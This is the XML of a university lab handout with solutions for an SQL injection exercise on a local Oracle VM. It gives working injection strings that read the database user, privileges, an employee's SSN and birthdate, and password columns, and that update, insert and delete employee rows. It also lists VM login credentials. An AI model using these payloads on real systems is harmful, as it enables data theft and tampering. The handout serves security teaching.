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F5CF" w14:textId="77777777" w:rsidR="00A6622D" w:rsidRDefault="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Preparation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E12BAB7" w14:textId="18FA77E9" w:rsidR="00A538EB" w:rsidRDefault="00D15FD2" w:rsidP="00A538EB">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Get </w:t>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:t>met_cs_674_oracle_linux_5_11g_r2_ee.ova</w:t>
      </w:r>
      <w:r w:rsidR="00796829">
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r w:rsidR="00A538EB" w:rsidRPr="00C1604A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://www.fshare.vn/file/UDZO344UPQ8O</w:t>
        </w:r>
      </w:hyperlink>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="774C7646" w14:textId="77777777" w:rsidR="00A6622D" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Install VirtualBox for Windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidRPr="00C1604A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.virtualbox.org/wiki/Downloads</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B6249F3" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Open VirtualBox</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14BBC61F" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Choose File/Import Appliance…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AC5ABF" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browser to </w:t>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ova file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29220FCE" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When login screen available, enter </w:t>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oracle</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>metcs674</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC51115" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Click on Firefox Browser and type this URL</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId9" w:history="1">
        <w:r w:rsidRPr="00C1604A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://localhost:8888/sql_injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="152D0270" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>You will see 3 examples to exercise</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC331D0" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D5B026F" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Part 1. SQL Injection Lab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17791832" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Part 1 </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA1EEAA" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15F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60" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Use a SQL Injection string in the Search field to get the name of the database user that the application is connecting to the database with. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Solution:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>Anything' UNION SELECT 'string','string', user from dual--'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4DA196" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2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color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Use a SQL Injection string in the Search field to get the system privileges granted to the user that the application is connecting to the database with. </w:t>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Solution:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Anything' UNION SELECT 'string','string', PRIVILEGE from USER_SYS_PRIVS--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="353535"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733CC950" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2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color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Use a SQL Injection string in the Search field to get the Social Security Number (SSN) and birthdate for "Michael Hartstein". (Hint: You will need to use a SQL Injection string to get the employee_id first.) </w:t>
      </w:r>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00150299">
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00150299">
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Solution:</w:t>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
        <w:t>1) Query all employees to find person whose last name is Hartstein</w:t>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>nything' UNION SELECT 'string',last_name, cast(employee_id as varchar(30)) from hr.employees</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>—‘</w:t>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
        <w:t xml:space="preserve">“201” </w:t>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>&lt;- Result here, but do it yourself first</w:t>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
        <w:t>2) From provided clues, try to table name related to SSN and birthdate first (Don’t remember syntax, google it by yourself)</w:t>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
        <w:t>3) From searched table name, get SSB and Birthdate value</w:t>
      </w:r>
      <w:r w:rsidR="00150299" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>anything' union select ssn, cast(birthdate as varchar(100)), cast(employee_id as varchar(30)) from SSN_B</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t xml:space="preserve">IRTHDATE where employee_id = </w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>{1)’s result}</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="00C032CB">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>--'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E03E963" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD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b/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Part 1 </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771D6762" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2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color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Use a SQL Injection string in the Search field to update the Employees table and double the salary of employee Alana Walsh. </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Solution:</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>');update hr.employees set salary = (select salary from hr.employees where last_name = 'Walsh' and first_name = 'Alana') * 2 where last_name = 'Walsh' and first_name = 'Alana'; END;--'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E141483" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2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color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Use a SQL Injection string in the Search field to insert a new employee into the employees table with employee_id 207 (</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Hint: </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">You can use a desc employees in SQL*Plus as the </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>“hr”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to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get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fields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of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employees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table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to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build</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> your insert </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">statement.) </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Solution:</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>'); insert into hr.employees values ('207', 'Henry', 'Theiry', 'henry@gmail.com', '865.432.1342', '24-APR-2016', 'SH_CLERK', '10000', null, 124, 50);END;--'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2363AD73" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2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color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Use a SQL Injection string in the Search field to delete the employee with employee_id 207 in the employees table. </w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Solution:</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>'); delete hr.employees where employee_id = 207; END;--'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4201CFAC" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD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b/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Part 1 </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A88CA7B" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2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360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Use a SQL Injection string in the Password field to get the password of the </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>“Admin”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>. (</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Hint: </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">First get the name of the column that contains passwords using user_tab_columns WHERE column_name like '%PASS%.). </w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Solution:</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
        <w:t>1) From provided table name in premise, find column should take value of password and username</w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Try this on example 1, which should list all results to further finding)</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>anything' union select 'string', table_name, COLUMN_NAME from ALL_TAB_COLUMNS--'</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Result </w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
        <w:t xml:space="preserve">+) </w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
        <w:t>APP_USER_PASSWORD</w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">+) </w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
        <w:t>APP_USER_USERNAME</w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
